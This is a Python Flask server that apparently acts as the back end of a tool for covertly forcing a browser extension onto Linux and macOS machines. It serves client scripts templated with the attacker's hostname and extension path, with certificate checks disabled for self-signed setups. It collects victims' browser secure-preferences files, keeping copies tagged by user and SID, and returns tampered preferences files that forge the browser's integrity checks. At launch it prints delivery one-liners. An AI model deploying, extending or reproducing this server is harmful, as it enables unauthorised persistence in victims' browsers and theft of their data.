from argparse import ArgumentParser
from flask import Flask, abort, request, send_file, send_from_directory
from utils import ensure_ssl_cert, get_inmem_file, show_oneliners, update_spf
import config


app = Flask(__name__)


@app.route('/')
def index():
    return '', 200


@app.route('/download/<directory>/<filename>')
def download_get(directory, filename):
    try:
        if directory == 'client':
            file_path = f'/app/download/{directory}/{filename}'
            with open(file_path, 'r') as file:
                content = file.read()

            cert_check = ''
            if config.SELF_SIGNED_CERT:
                if filename == 'linux':
                    cert_check = ' --no-check-certificate'
                elif filename == 'macos':
                    cert_check = ' -k'

            content = content.replace('#CERT_CHECK#', cert_check)
            content = content.replace('#HOSTNAME#', config.HOSTNAME)
            content = content.replace('#EXTENSION_NAME#', config.EXTENSION_NAME)
            content = content.replace('#EXTENSION_PATH#', config.EXTENSION_PATH[filename])

            return send_file(get_inmem_file(content), as_attachment = True, download_name = filename)
        else:
            return send_from_directory(f'/app/download/{directory}', filename, as_attachment = True)
    except:
        abort(404)


@app.route('/upload/', methods = ['POST'])   
def upload_file():
    for element in ['extension', 'os', 'sid', 'user']:
        if element not in request.values:
            abort(400, description = f'No {element} value')

    if 'file' in request.files:
        f = request.files['file']
        data = f.read()
    elif request.data:
        data = request.data
    else:
        abort(400, description = f'Missing file')
    
    data = data.decode('utf-8')

    spf = update_spf(
        request.values['extension'],
        request.values['os'],
        request.values['sid'],
        request.values['user'],
        data
    )

    filename = f'{request.values["extension"]}-{request.values["os"]}-{request.values["sid"]}-{request.values["user"]}'
    with open(f'upload/{filename}-secure_preferences.json', 'w', encoding = 'utf-8') as f:
        f.write(data)

    return send_file(get_inmem_file(spf), as_attachment = True, download_name = config.SECURE_PREFERENCES_FILENAME[request.values['os']])


if __name__ == '__main__':
    parser = ArgumentParser()
    parser.add_argument('--hostname', type = str, default = config.HOSTNAME)
    parser.add_argument('--extension', type = str, default = config.EXTENSION_NAME)

    args = parser.parse_args()
    config.HOSTNAME = args.hostname
    config.EXTENSION_NAME = args.extension

    ensure_ssl_cert()

    show_oneliners(config.HOSTNAME)

    app.run(host = '0.0.0.0', debug = False, port = 443, ssl_context = (config.CERT_FILE, config.KEY_FILE))
